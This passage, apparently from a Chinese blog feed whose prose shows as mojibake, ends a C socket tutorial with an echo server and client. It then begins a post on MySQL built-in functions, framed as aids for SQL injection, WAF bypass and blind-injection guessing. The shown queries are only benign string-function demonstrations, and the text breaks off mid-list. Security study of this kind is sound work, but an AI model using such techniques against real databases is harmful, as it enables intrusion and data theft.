class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>å‚æ•° fd ä¸ºä¸€ä¸ªå¥—æ¥å­—æè¿°ç¬¦ã€‚</p><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p><code>config.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * config.h åŒ…å«è¯¥tcp/ipå¥—æ¥å­—ç¼–ç¨‹æ‰€éœ€è¦çš„åŸºæœ¬å¤´æ–‡ä»¶ï¼Œä¸server.c client.cä½äºåŒä¸€ç›®å½•ä¸‹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_LINE = <span class="number">2048</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">6000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BACKLOG = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LISTENQ = <span class="number">6666</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_CONNECT = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p><code>server.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * server.cä¸ºæœåŠ¡å™¨ç«¯ä»£ç </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*å£°æ˜æœåŠ¡å™¨åœ°å€å’Œå®¢æˆ·é“¾æ¥åœ°å€*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span> , <span class="title">cliaddr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*å£°æ˜æœåŠ¡å™¨ç›‘å¬å¥—æ¥å­—å’Œå®¢æˆ·ç«¯é“¾æ¥å¥—æ¥å­—*/</span></span><br><span class="line"><span class="keyword">int</span> listenfd , connfd;</span><br><span class="line"><span class="keyword">pid_t</span> childpid;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*å£°æ˜ç¼“å†²åŒº*/</span></span><br><span class="line"><span class="keyword">char</span> buf[MAX_LINE];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">socklen_t</span> clilen;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(1) åˆå§‹åŒ–ç›‘å¬å¥—æ¥å­—listenfd*/</span></span><br><span class="line"><span class="keyword">if</span>((listenfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(2) è®¾ç½®æœåŠ¡å™¨sockaddr_inç»“æ„*/</span></span><br><span class="line">bzero(&amp;servaddr , <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"> </span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY); <span class="comment">//è¡¨æ˜å¯æ¥å—ä»»æ„IPåœ°å€</span></span><br><span class="line">servaddr.sin_port = htons(PORT);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(3) ç»‘å®šå¥—æ¥å­—å’Œç«¯å£*/</span></span><br><span class="line"><span class="keyword">if</span>(bind(listenfd , (struct sockaddr*)&amp;servaddr , <span class="keyword">sizeof</span>(servaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(4) ç›‘å¬å®¢æˆ·è¯·æ±‚*/</span></span><br><span class="line"><span class="keyword">if</span>(listen(listenfd , LISTENQ) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(5) æ¥å—å®¢æˆ·è¯·æ±‚*/</span></span><br><span class="line"><span class="keyword">for</span>( ; ; )</span><br><span class="line">&#123;</span><br><span class="line">clilen = <span class="keyword">sizeof</span>(cliaddr);</span><br><span class="line"><span class="keyword">if</span>((connfd = accept(listenfd , (struct sockaddr *)&amp;cliaddr , &amp;clilen)) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;accept error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ–°å»ºå­è¿›ç¨‹å•ç‹¬å¤„ç†é“¾æ¥</span></span><br><span class="line"><span class="keyword">if</span>((childpid = fork()) == <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">close(listenfd);</span><br><span class="line"><span class="comment">//str_echo</span></span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line"><span class="keyword">char</span> buff[MAX_LINE];</span><br><span class="line"><span class="keyword">while</span>((n = read(connfd , buff , MAX_LINE)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(connfd , buff , n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line">close(connfd);</span><br><span class="line">&#125;<span class="comment">//for</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*(6) å…³é—­ç›‘å¬å¥—æ¥å­—*/</span></span><br><span class="line">close(listenfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>client.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * client.cä¸ºå®¢æˆ·ç«¯ä»£ç </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*readlineå‡½æ•°å®ç°*/</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">readline</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *vptr, <span class="keyword">size_t</span> maxlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span>n, rc;</span><br><span class="line"><span class="keyword">char</span>c, *ptr;</span><br><span class="line"> </span><br><span class="line">ptr = vptr;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; maxlen; n++) &#123;</span><br><span class="line"><span class="keyword">if</span> ( (rc = read(fd, &amp;c,<span class="number">1</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">*ptr++ = c;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* newline is stored, like fgets() */</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">*ptr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span>(n - <span class="number">1</span>);<span class="comment">/* EOF, n - 1 bytes were read */</span></span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">-1</span>);<span class="comment">/* error, errno set by read() */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">*ptr = <span class="number">0</span>;<span class="comment">/* null terminate like fgets() */</span></span><br><span class="line"><span class="keyword">return</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*å£°æ˜å¥—æ¥å­—å’Œé“¾æ¥æœåŠ¡å™¨åœ°å€*/</span></span><br><span class="line"><span class="keyword">int</span> sockfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*åˆ¤æ–­æ˜¯å¦ä¸ºåˆæ³•è¾“å…¥*/</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;usage:tcpcli &lt;IPaddress&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(1) åˆ›å»ºå¥—æ¥å­—*/</span></span><br><span class="line"><span class="keyword">if</span>((sockfd = socket(AF_INET , SOCK_STREAM , <span class="number">0</span>)) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;socket error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(2) è®¾ç½®é“¾æ¥æœåŠ¡å™¨åœ°å€ç»“æ„*/</span></span><br><span class="line">bzero(&amp;servaddr , <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_port = htons(PORT);</span><br><span class="line"><span class="keyword">if</span>(inet_pton(AF_INET , argv[<span class="number">1</span>] , &amp;servaddr.sin_addr) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;inet_pton error for %s\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(3) å‘é€é“¾æ¥æœåŠ¡å™¨è¯·æ±‚*/</span></span><br><span class="line"><span class="keyword">if</span>( connect(sockfd , (struct sockaddr *)&amp;servaddr , <span class="keyword">sizeof</span>(servaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(4) æ¶ˆæ¯å¤„ç†*/</span></span><br><span class="line"><span class="keyword">char</span> sendline[MAX_LINE] , recvline[MAX_LINE];</span><br><span class="line"><span class="keyword">while</span>(fgets(sendline , MAX_LINE , <span class="built_in">stdin</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(sockfd , sendline , <span class="built_in">strlen</span>(sendline));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(readline(sockfd , recvline , MAX_LINE) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;server terminated prematurely&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">fputs</span>(recvline , <span class="built_in">stdout</span>) == EOF)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;fputs error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">//if</span></span><br><span class="line">&#125;<span class="comment">//while</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*(5) å…³é—­å¥—æ¥å­—*/</span></span><br><span class="line">close(sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210225173823677.png" alt="image-20210225173823677"></p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://www.cnblogs.com/dolphinx/p/3460545.html">ç®€å•ç†è§£Socket</a></p><p>[2] <a href="https://blog.csdn.net/fly_yr/article/details/50387065">åŸºæœ¬å¥—æ¥å­—ç¼–ç¨‹ï¼ˆ1ï¼‰ â€“ tcpç¯‡</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLå‡½æ•°åŠææƒ</title>
      <link href="posts/22595.html"/>
      <url>posts/22595.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>åœ¨ sql æ³¨å…¥æ—¶ä¸ºäº†åº”å¯¹å„ç§é™åˆ¶æªæ–½ï¼Œåˆ©ç”¨æ•°æ®åº“è‡ªå¸¦çš„ä¸€äº›ç³»ç»Ÿå‡½æ•°ç»è¿‡å„ç§å˜æ¢ä¹‹åå¯ä»¥ç»•è¿‡ä¸€äº› å®‰å…¨è®¾å¤‡æˆ–è€…ä¸€äº›åŸºç¡€é˜²å¾¡çš„æªæ–½ï¼Œæ¯”å¦‚ä¸€äº›å­—ç¬¦ä¸²è½¬æ¢çš„å‡½æ•°ã€æˆªå–å­—ç¬¦ä¸²é•¿åº¦çš„å‡½æ•°ç­‰ï¼Œ</p><p> åº”ç”¨çš„åœºæ™¯åŒ…æ‹¬ï¼šé€šè¿‡æ³¨å…¥è·å–æ•°æ®ã€å˜æ¢å­—ç¬¦ä¸²ç»•è¿‡ WAFã€ç›²æ³¨çŒœè§£å­—ç¬¦æ•°æ®ç­‰ </p></blockquote><h1 id="MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•"><a href="#MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•" class="headerlink" title="MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•"></a>MySQLè‡ªå¸¦å‡½æ•°çš„åŠŸèƒ½ä¸ç”¨æ³•</h1><h2 id="MySQL-å­—ç¬¦ä¸²å‡½æ•°"><a href="#MySQL-å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="MySQL å­—ç¬¦ä¸²å‡½æ•°"></a>MySQL å­—ç¬¦ä¸²å‡½æ•°</h2><p><strong>1.ASCII(s)</strong>   </p><p>è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ASCII(&#39;MySQL&#39;) AS NumCodeOfFirstChar;</span><br><span class="line">+--------------------+</span><br><span class="line">| NumCodeOfFirstChar |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 77 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>2.CHAR_LENGTH(s)</strong></p><p>è¿”å›å­—ç¬¦ä¸² s çš„å­—ç¬¦æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CHAR_LENGTH(&quot;MySQL&quot;) AS LengthOfString;</span><br><span class="line">+----------------+</span><br><span class="line">| LengthOfString |</span><br><span class="line">+----------------+</span><br><span class="line">|              5 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>3.CONCAT(s1,s2â€¦sn)</strong></p><p>å­—ç¬¦ä¸² s1,s2 ç­‰å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT (&#39;I&#39;,&#39; &#39;,&#39;am&#39;,&#39; &#39;,&#39;learning&#39;,&#39; &#39;,&#39;MySQL&#39;,&#39;.&#39;) AS ConcatenatedString;</span><br><span class="line">+----------------------+</span><br><span class="line">| ConcatenatedString   |</span><br><span class="line">+----------------------+</span><br><span class="line">| I am learning MySQL. |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„åŒºåˆ«  CONCAT_WS(x, s1,s2â€¦sn)</strong></p><p>åŒ CONCAT(s1,s2,â€¦) å‡½æ•°ï¼Œä½†æ˜¯æ¯ä¸ªå­—ç¬¦ä¸²ä¹‹é—´è¦åŠ ä¸Š xï¼Œx å¯ä»¥æ˜¯åˆ†éš”ç¬¦</p><p><strong>ä¸  group_concat( [DISTINCT] è¦è¿æ¥çš„å­—æ®µ [Order BY æ’åºå­—æ®µ ASC/DESC] [Separator â€˜åˆ†éš”ç¬¦â€™] )</strong></p><p>å¯é…åˆ<strong>group_by</strong>ä½¿ç”¨</p><p><strong>4.FIELD(s,s1,s2â€¦)</strong></p><p>è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸² s åœ¨å­—ç¬¦ä¸²åˆ—è¡¨(s1,s2â€¦)ä¸­çš„ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   3 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.FIND_IN_SET(s1,s2)</strong></p><p>è¿”å›åœ¨å­—ç¬¦ä¸²s2ä¸­ä¸s1åŒ¹é…çš„å­—ç¬¦ä¸²çš„ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            3 |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.FORMAT(x,n)</strong></p><p>å‡½æ•°å¯ä»¥å°†æ•°å­— x è¿›è¡Œæ ¼å¼åŒ– â€œ#,###.##â€, å°† x ä¿ç•™åˆ°å°æ•°ç‚¹å n ä½ï¼Œæœ€åä¸€ä½å››èˆäº”å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FORMAT(3.1415926535,4);</span><br><span class="line">+------------------------+</span><br><span class="line">| FORMAT(3.1415926535,4) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 3.1416                 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.INSERT(s1,x,len,s2)</strong></p><p>å­—ç¬¦ä¸² s2 æ›¿æ¢ s1 çš„ x ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| YourSQL                    |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.LOCATE(s1,s)</strong></p><p>ä»å­—ç¬¦ä¸² s ä¸­è·å– s1 çš„å¼€å§‹ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>9.LOWER(s)|LCASE(s)</strong></p><p>å°†å­—ç¬¦ä¸² s çš„æ‰€æœ‰å­—æ¯å˜æˆå°å†™å­—æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOWER(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LOWER(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT LCASE(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LCASE(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.UPPER(s)|UCASE(s)</strong></p><p>å°†å­—ç¬¦ä¸² s çš„æ‰€æœ‰å­—æ¯å˜æˆå¤§å†™å­—æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT UPPER(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UPPER(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT 